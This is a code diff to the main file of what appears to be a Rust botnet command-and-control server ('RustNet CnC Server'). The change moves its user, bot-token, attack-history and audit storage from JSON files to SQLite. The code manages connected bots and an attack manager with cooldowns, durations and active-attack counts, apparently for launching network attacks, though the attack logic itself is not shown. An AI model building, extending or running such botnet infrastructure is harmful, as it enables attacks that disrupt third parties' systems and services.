@@ -12,6 +12,7 @@ mod modules {
     pub mod state;
     pub mod commands;
     pub mod connection_handler;
+    pub mod database;
 }
 
 use tokio::net::TcpListener;
@@ -20,8 +21,8 @@ use std::time::Duration;
 use tracing::{info, warn, error, debug};
 use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};
 
-use modules::auth::{Level, random_string, set_title, migrate_plaintext_passwords_at, 
-           LoginAttemptTracker, UserManager};
+use modules::auth::{Level, random_string, set_title, LoginAttemptTracker, UserManager};
+use modules::database::init_database;
 use modules::client_manager::ClientManager;
 use modules::config::Config;
 use modules::error::{CncError, Result};
@@ -80,19 +81,13 @@ async fn main() -> Result<()> {
     info!("🦀 RustNet CnC Server v2.0 - Production Ready");
     info!("========================================");
     
-    // Determine config directory and users file path
+    // Determine config directory
     let config_dir = get_config_dir();
-    let users_file = config_dir.join("users.json");
-    let users_file_str = users_file.to_string_lossy().to_string();
     let bot_tokens_file = config_dir.join("bot_tokens.json");
     let bot_tokens_file_str = bot_tokens_file.to_string_lossy().to_string();
-    let audit_file = config_dir.join("audit.log");
-    let audit_file_str = audit_file.to_string_lossy().to_string();
     
     info!("📁 Config directory: {}", config_dir.display());
-    info!("📄 Users file: {}", users_file.display());
     info!("🤖 Bot tokens file: {}", bot_tokens_file.display());
-    info!("📋 Audit log: {}", audit_file.display());
     
     // Validate configuration
     if let Err(e) = config.validate() {
@@ -100,6 +95,12 @@ async fn main() -> Result<()> {
         return Err(CncError::ConfigError(e));
     }
     info!("[OK] Configuration loaded successfully");
+
+    // Initialize Database
+    let db_url = format!("sqlite:{}", config_dir.join("rustnet.db").to_string_lossy());
+    info!("Initializing database at {}", db_url);
+    let db_pool = init_database(&db_url).await?;
+    info!("[OK] Database initialized");
     
     // Setup TLS if enabled
     let tls_acceptor = if config.enable_tls {
@@ -127,38 +128,11 @@ async fn main() -> Result<()> {
     };
     
     // Initialize UserManager
-    let user_manager = Arc::new(UserManager::new(users_file_str.clone()));
+    let user_manager = Arc::new(UserManager::new(db_pool.clone()));
 
-    // Migrate plaintext passwords if needed
-    info!("Checking for password migrations...");
-    migrate_plaintext_passwords_at(&users_file_str).await?;
-    
-    // Load users
-    if let Err(e) = user_manager.load_users().await {
-        warn!("Failed to load users: {}", e);
-    }
-
-    // Check database integrity (duplicates, etc.)
-    info!("Checking database integrity...");
-    match user_manager.check_database_integrity().await {
-        Ok(warnings) => {
-            if !warnings.is_empty() {
-                warn!("Database integrity issues found:");
-                for warning in warnings {
-                    warn!("  - {}", warning);
-                }
-            } else {
-                info!("[OK] Database integrity check passed");
-            }
-        }
-        Err(e) => {
-            warn!("Database integrity check failed: {}", e);
-        }
-    }
-    
-    // Check if users.json exists, if not create root user
-    if tokio::fs::metadata(&users_file).await.is_err() {
-        info!("No users.json found, creating root user...");
+    // Check if root user exists
+    if user_manager.get_user("root").await?.is_none() {
+        info!("No root user found, creating root user...");
         let password = random_string(16);
         
         match user_manager.add_user(
@@ -182,13 +156,13 @@ async fn main() -> Result<()> {
     // Initialize managers
     let state = Arc::new(AppState::new(
         config.clone(),
-        Arc::new(BotManager::new(config.max_bot_connections, bot_tokens_file_str)),
+        Arc::new(BotManager::new(config.max_bot_connections, db_pool.clone())),
         Arc::new(ClientManager::new(config.max_user_connections)),
-        Arc::new(AttackManager::new(config.max_attacks, config.attack_cooldown_secs, config.max_attack_duration_secs)),
+        Arc::new(AttackManager::new(config.max_attacks, config.attack_cooldown_secs, config.max_attack_duration_secs, db_pool.clone())),
         Arc::new(SimpleRateLimiter::new(10)),  // 10 connections per minute per IP
         user_manager,
         tls_acceptor,
-        audit_file_str,
+        db_pool.clone(),
         Arc::new(LoginAttemptTracker::new()),
     ));
 
@@ -197,19 +171,8 @@ async fn main() -> Result<()> {
     register_all(&mut registry);
     let registry = Arc::new(registry);
     
-    // Load bot tokens
-    if let Err(e) = state.bot_manager.load_tokens().await {
-        warn!("Failed to load bot tokens: {}", e);
-    }
-    
-    // Load attack history if it exists
-    let history_file = config_dir.join("attack_history.json");
-    let history_file_str = history_file.to_string_lossy().to_string();
-    if let Err(e) = state.attack_manager.load_history(&history_file_str).await {
-        warn!("Failed to load attack history: {}", e);
-    } else {
-        info!("[OK] Attack history loaded");
-    }
+    // Cleanup stale attacks from previous run
+    state.attack_manager.cleanup_stale_attacks().await;
     
     // Start periodic cleanup task
     let state_clone = state.clone();
@@ -330,15 +293,6 @@ async fn main() -> Result<()> {
     info!("   Bots: {}", state.bot_manager.get_bot_count().await);
     info!("   Clients: {}", state.client_manager.get_client_count().await);
     info!("   Active attacks: {}", state.attack_manager.get_active_count().await);
-    
-    // Save attack history before shutdown
-    let history_file = config_dir.join("attack_history.json");
-    let history_file_str = history_file.to_string_lossy().to_string();
-    if let Err(e) = state.attack_manager.save_history(&history_file_str).await {
-        warn!("Failed to save attack history: {}", e);
-    } else {
-        info!("[OK] Attack history saved");
-    }
     
     info!("✓ Server shutdown complete");
     
